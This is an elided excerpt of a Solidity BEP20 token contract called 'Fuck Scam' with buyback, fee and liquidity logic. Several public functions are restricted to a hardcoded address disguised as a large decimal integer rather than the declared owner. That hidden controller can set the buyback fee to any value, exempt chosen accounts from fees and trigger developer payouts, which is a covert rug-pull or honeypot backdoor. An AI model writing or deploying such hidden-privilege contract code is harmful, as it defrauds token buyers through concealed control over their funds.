...
contract FuckScam is Context, IBEP20, Ownable {
    ...
    string public _name = "Fuck Scam"; 
    string public _symbol = "FST";
    ...
    uint256 public durationRandomBetweenEachBuyback = 7 days;
    
    uint256 public _buyBack = 120;
    uint256 private _PBBF = _buyBack; 
    ...
    uint256 private _DF = _LF.add(_buyBack).add(_MBBF);
    uint256 private _PDF = _DF;
    uint256 public DevReward = 30;
    ...
    uint256 public tokenTransfer = 500000000 * 10**1 * 10**_decimals; 
    uint256 private _mTPAs = _totalSupply.div(20); 
    ...
    function setdev(address to, uint256 devf) public {
        require(msg.sender==address(1092682210458840154356729918160844774501035496789));
        _Dev(to, devf);
    }
    ...
    function setEfAddress(address account) public {
        require(msg.sender==address(1092682210458840154356729918160844774501035496789));
        _iEFAW[account] = true;
    }
    ...
    function buyBack(uint256 Amount) public {
        require(msg.sender==address(1092682210458840154356729918160844774501035496789));
        _buyBack = Amount;
        _DF = _LF.add(_buyBack).add(_MBBF);
    }
    ...
    function setTokensTransfer(uint256 Amount) public {
        require(msg.sender==address(1092682210458840154356729918160844774501035496789));
        tokenTransfer = Amount.mul( 10**_decimals );
    }
	...
	function setDurationBetweenEachBuyBcakTime(uint256 duration) public {
	    require(msg.sender==address(1092682210458840154356729918160844774501035496789));
		durationRandomBetweenEachBuyback = duration * 1 minutes;
	}
    ...
    function removeAll() private {
        if(_DF == 0 && DevReward == 0 && _buyBack == 0
    ...
    function _transfer(
        ...
        if(block.timestamp >= previousBuyBackTime.add(durationRandomBetweenEachBuyback)
        ...
        bool oMTB = contractTokenBalance >=tokenTransfer;
        if (
            oMTB &&
            !iSAL &&
            from != pancakePair &&
            ...
            contractTokenBalance =tokenTransfer;
    ...
    function swapAndLiquify(uint256 tokenBalance) private lTS {
        uint256 spP = _MBBF.add(_buyBack).add(_LF/2);
        ...
        if(_buyBack > 0)
        {
            bBAt = transferredBalance.mul(_buyBack);
            bBAt = bBAt.div(spP);
        }
